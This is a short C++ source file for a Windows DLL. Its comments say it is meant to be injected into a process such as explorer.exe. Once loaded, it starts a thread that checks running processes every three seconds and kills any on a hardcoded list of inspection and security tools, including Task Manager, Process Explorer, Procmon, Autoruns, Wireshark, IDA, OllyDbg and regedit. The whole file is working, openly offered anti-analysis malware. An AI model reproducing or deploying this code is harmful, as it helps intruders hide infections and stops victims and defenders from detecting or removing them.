/*
Jake McLellan
Constantly terminates processes in denylist
DLL format allows for simple DLL injection :)
*/


// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <vector>
#include <Windows.h>
#include<iostream>
#include <vector>
#include <processthreadsapi.h>
#include <tlhelp32.h>

// Infinite loop that searches for processes by name and kills them
void termProcs() {
    std::vector<std::string> denylist{ "procexp.exe", "procexp64.exe", "Tcpview.exe", "tcpview64.exe", "Autoruns.exe", "Autoruns64.exe", "autorunsc.exe", "autorunsc64.exe", "Taskmgr.exe", "Procmon.exe", "Procmon64.exe", "ida64.exe", "OLLYDBG.EXE", "regedit.exe", "Wireshark.exe" };
    while (true) {
        HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(PROCESSENTRY32);
        Process32First(hTH32, &procEntry);
        do
        {
            //Convert wide string to string
            std::wstring ws(procEntry.szExeFile);
            std::string str(ws.begin(), ws.end());
            //If the name is in the vector, terminate it
            if (std::find(denylist.begin(), denylist.end(), str) != denylist.end()) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, NULL, procEntry.th32ProcessID);
                TerminateProcess(hProcess, 0);
            }
        } while (Process32Next(hTH32, &procEntry));
        //Sleep 3 seconds
        Sleep(3000);
    }
    return;
}

// Necessary function for this program to be implemented as a DLL
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //This is the best way to start the injected code so you won't crash explorer.exe
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)termProcs, NULL, 0, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}